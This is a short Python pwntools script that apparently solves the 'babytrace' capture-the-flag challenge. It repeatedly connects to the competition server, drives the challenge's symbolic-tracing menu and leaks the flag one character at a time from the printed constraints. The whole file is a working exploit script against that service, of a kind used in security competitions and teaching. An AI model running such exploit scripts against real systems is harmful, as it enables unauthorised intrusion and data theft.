#!/usr/bin/env python2

import pwn

remote = True

flag = ""
last_char = ""
index = 0

while last_char != '}':
    if remote:
        r = pwn.remote("babytrace.quals2019.oooverflow.io", 5000)
    else:
        r = pwn.process("pitas.py")

    # Header
    r.recvuntil("# Are you ready for the PITA?\n\n")

    # Binary select
    r.recvuntil("Choice: ")
    r.sendline("2")

    # start trace
    r.recvuntil("Choice: ")
    r.sendline("1")

    # add input constraint
    r.recvuntil("Choice: ")
    r.sendline("3")
    # r.sendline("input")
    r.sendline(format(index, '02x')+"000000")

    # run program
    r.recvuntil("Choice: ")
    r.sendline("0")

    # step program
    r.recvuntil("Choice: ")
    r.sendline("1")
    r.sendline("11")

    # symbolize eax
    r.recvuntil("Choice: ")
    r.sendline("6")
    r.sendline("eax")

    # print constraints
    # print(r.recvuntil("Choice: "))
    r.recvuntil("Choice: ")
    r.sendline("7")
    
    r.recvuntil("CONSTRAINTS: [<Bool ")
    last_char = chr(int(r.recv(4), 16))
    flag += last_char
    index += 1
    print(flag)
    # r.interactive()

print(flag)